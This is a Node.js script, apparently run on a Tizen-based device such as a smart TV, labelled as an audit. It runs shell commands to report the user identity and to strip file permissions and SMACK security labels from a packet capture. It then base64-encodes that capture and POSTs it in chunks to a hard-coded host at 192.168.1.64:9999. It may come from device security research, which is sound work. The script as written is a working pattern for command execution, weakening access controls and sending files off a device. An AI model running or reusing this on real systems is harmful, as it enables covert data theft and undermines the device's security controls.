"use strict";
// audit117.js - fix file perms + transfer pcap in chunks (Node 4.4 compatible).
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 4000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.id = sh("id | head -c 100", 150);

// fix file permissions
out.chmod = sh("chmod 666 /opt/usr/home/owner/acr_capture.pcap 2>&1; chsmack -a '*' /opt/usr/home/owner/acr_capture.pcap 2>&1; echo RC=$?", 300);
out.ls = sh("ls -la /opt/usr/home/owner/acr_capture.pcap 2>&1", 300);

post("/p117_test", out);

// transfer pcap
var FILE = "/opt/usr/home/owner/acr_capture.pcap";
var CHUNK = 300000;

try {
    var stat = fs.statSync(FILE);
    out.file_size = stat.size;
    out.total_chunks = Math.ceil(stat.size / CHUNK);
    post("/p117_start", out);

    var fd = fs.openSync(FILE, "r");
    var offset = 0;
    var idx = 0;

    function sendChunk() {
        if (offset >= stat.size) {
            fs.closeSync(fd);
            post("/p117_done", { chunks: idx, total: out.total_chunks });
            return;
        }
        var toRead = Math.min(CHUNK, stat.size - offset);
        var buf = new Buffer(toRead);
        fs.readSync(fd, buf, 0, toRead, offset);
        post("/p117_chunk", { i: idx, d: buf.toString("base64") });
        offset += toRead;
        idx++;
        setTimeout(sendChunk, 30);
    }
    sendChunk();
} catch (e) {
    post("/p117_err", { err: e.message });
}
